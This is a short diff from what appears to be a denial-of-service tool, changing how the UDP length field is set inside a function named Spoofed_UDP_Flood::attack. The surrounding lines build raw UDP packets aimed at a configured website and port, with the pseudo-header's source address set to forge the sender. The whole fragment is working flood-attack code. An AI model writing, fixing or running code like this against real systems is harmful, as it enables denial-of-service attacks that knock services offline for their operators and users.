@@ -63,7 +63,7 @@ void Spoofed_UDP_Flood::attack(const int *id) {
             // UDP Struct
             udp->source = htons(static_cast<uint16_t>(s_port));
             udp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
-            udp->len = htons(static_cast<uint16_t>(8 + strlen(buf)));
+            udp->len = htons(static_cast<uint16_t>(sizeof(struct udphdr)));
             udp->check = 0;
 
             psh.source_address = inet_addr(conf->website.c_str());
